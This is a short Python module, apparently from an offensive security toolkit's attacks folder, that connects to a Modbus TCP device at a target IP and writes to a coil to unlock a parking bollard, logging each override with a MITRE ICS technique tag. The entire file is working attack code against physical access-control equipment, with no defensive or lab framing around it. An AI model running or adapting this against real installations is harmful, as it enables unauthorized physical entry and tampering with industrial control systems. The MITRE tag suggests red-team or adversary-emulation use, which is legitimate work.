# modules/attacks/parking_bollard_override.py

import argparse
from pymodbus.client import ModbusTcpClient
import json
import os
import time
from datetime import datetime

LOG_FILE = "results/bollard_override_log.json"
MITRE_TTP = "T0856"

def log_action(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def override_bollard(ip, port=502, coil_address=0):
    client = ModbusTcpClient(ip, port=port)
    if not client.connect():
        print(f"[!] Connection to {ip}:{port} failed.")
        return

    print(f"[+] Sending override to Modbus coil {coil_address}")
    client.write_coil(coil_address, True)
    time.sleep(1)
    client.close()

    log_action({
        "timestamp": datetime.utcnow().isoformat(),
        "target": f"{ip}:{port}",
        "coil_address": coil_address,
        "command": "UNLOCK",
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus Parking Bollard Override")
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=502, help="Modbus TCP port")
    parser.add_argument("--coil", type=int, default=0, help="Coil address to write TRUE (unlock)")
    args = parser.parse_args()

    override_bollard(args.ip, args.port, args.coil)
